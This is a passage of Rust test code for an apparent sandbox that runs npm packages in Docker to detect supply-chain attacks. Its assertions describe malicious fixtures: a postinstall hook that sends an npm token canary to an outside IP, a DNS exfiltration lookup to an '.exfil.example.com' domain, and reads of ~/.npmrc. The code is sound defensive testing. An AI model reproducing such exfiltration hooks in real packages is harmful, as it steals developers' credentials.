        collect(&ev, "dev", &c, &mut r);
        assert_eq!(r.attempts.len(), 2, "node-gyp exec is dropped, malformed line ignored");
        assert_eq!(r.attempts[0].canary_hits, vec!["npm-token"]);
        assert_eq!(r.attempts[0].phase, "install");
        assert_eq!(r.attempts[1].kind, "dns");
        assert_eq!(r.file_reads, vec![FileRead { path: "~/.npmrc".into(), phase: "install".into(), run: "dev".into() }]);
    }

    fn b32(data: &[u8]) -> String {
        const A: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        let (mut acc, mut bits, mut out) = (0u64, 0u8, String::new());
        for &b in data {
            acc = (acc << 8) | b as u64;
            bits += 8;
            while bits >= 5 {
                bits -= 5;
                out.push(A[((acc >> bits) & 31) as usize] as char);
            }
        }
        if bits > 0 {
            out.push(A[((acc << (5 - bits)) & 31) as usize] as char);
        }
        out
    }

    // --- docker-gated integration tests ------------------------------------------

    fn fixture_tarball(dir: &str) -> Option<(tempfile::TempDir, PathBuf)> {
        let src = Path::new(env!("CARGO_MANIFEST_DIR")).join("sandbox/fixtures").join(dir);
        let out = tempfile::tempdir().ok()?;
        let o = std::process::Command::new("npm")
            .args(["pack", "--ignore-scripts", "--silent", "--pack-destination"])
            .arg(out.path())
            .current_dir(&src)
            .output()
            .ok()?;
        let file = String::from_utf8_lossy(&o.stdout).trim().lines().last()?.to_string();
        let p = out.path().join(file);
        p.exists().then_some((out, p))
    }

    async fn sandbox(dir: &str, name: &str) -> Option<SandboxReport> {
        if !available() {
            eprintln!("skipping sandbox integration test: docker not available");
            return None;
        }
        let (_keep, tarball) = fixture_tarball(dir).expect("npm pack fixture");
        let r = run(&SandboxInput { name: name.into(), version: "1.0.0".into(), tarball, registry: "https://registry.npmjs.org".into() }).await;
        eprintln!("{name}: {} in {}ms\n{}", r.status, r.duration_ms, serde_json::to_string_pretty(&r).unwrap());
        Some(r)
    }

    #[tokio::test]
    async fn docker_exfil_postinstall_hits_npm_canary_at_install() {
        let Some(r) = sandbox("exfil-postinstall", "npryx-fixture-exfil-postinstall").await else { return };
        assert_eq!(r.status, "ok", "{:?}", r.reason);
        assert_eq!(r.runs, vec!["dev", "ci"]);
        let hit = r.attempts.iter().find(|a| a.kind == "http" && a.target.contains("45.77.12.9")).expect("http attempt");
        assert_eq!(hit.phase, "install");
        assert!(hit.canary_hits.contains(&"npm-token".to_string()), "{hit:?}");
    }

    #[tokio::test]
    async fn docker_dns_import_is_seen_at_import() {
        let Some(r) = sandbox("dns-import", "npryx-fixture-dns-import").await else { return };
        assert_eq!(r.status, "ok", "{:?}", r.reason);
        assert!(r.attempts.iter().any(|a| a.kind == "dns" && a.phase == "import" && a.target.ends_with(".exfil.example.com")), "{:?}", r.attempts);
    }

    #[tokio::test]
    async fn docker_benign_has_no_attempts() {
        let Some(r) = sandbox("benign", "npryx-fixture-benign").await else { return };
        assert_eq!(r.status, "ok", "{:?}", r.reason);
        assert!(r.attempts.is_empty(), "{:?}", r.attempts);
        assert!(r.file_reads.is_empty(), "{:?}", r.file_reads);
    }
}
